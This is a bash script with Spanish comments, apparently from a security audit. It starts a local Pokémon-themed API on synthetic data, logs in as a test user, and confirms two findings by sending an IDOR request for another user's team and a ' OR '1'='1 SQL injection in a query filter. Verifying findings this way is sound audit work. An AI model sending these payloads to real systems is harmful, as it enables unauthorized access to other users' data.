#!/usr/bin/env bash
# =====================================================================
#  Confirmacion manual de los hallazgos H-01 (IDOR) y H-02 (inyeccion SQL)
#  Arranca la API en 127.0.0.1:3001 con datos sinteticos, repite las
#  peticiones con curl y detiene el servidor al terminar.
#  Uso:  bash security/confirmar-manual.sh
# =====================================================================
set -u
cd "$(dirname "$0")/../poke-server" || exit 2
(PORT=3001 exec node src/server.js >/dev/null 2>&1) &
PID=$!
trap 'kill $PID 2>/dev/null' EXIT
sleep 1.5
BASE=http://127.0.0.1:3001

TOKEN=$(curl -s -X POST "$BASE/api/login" -H "Content-Type: application/json" \
  -d '{"username":"ash","password":"pikachu123"}' |
  node -e 'let d="";process.stdin.on("data",c=>d+=c).on("end",()=>console.log(JSON.parse(d).token))')
echo "# Sesion iniciada como ash (usuario 1)"

echo
echo "# H-01 IDOR: ash pide el equipo 2, que pertenece a misty"
echo "\$ curl $BASE/api/teams/2 -H \"Authorization: Bearer \$TOKEN\""
curl -s -w "\nHTTP %{http_code}\n" "$BASE/api/teams/2" -H "Authorization: Bearer $TOKEN"

echo
echo "# H-02 Inyeccion SQL: filtro name = ' OR '1'='1"
echo "\$ curl \"$BASE/api/teams?name=%27%20OR%20%271%27=%271\" -H \"Authorization: Bearer \$TOKEN\""
curl -s -w "\nHTTP %{http_code}\n" "$BASE/api/teams?name=%27%20OR%20%271%27=%271" -H "Authorization: Bearer $TOKEN"
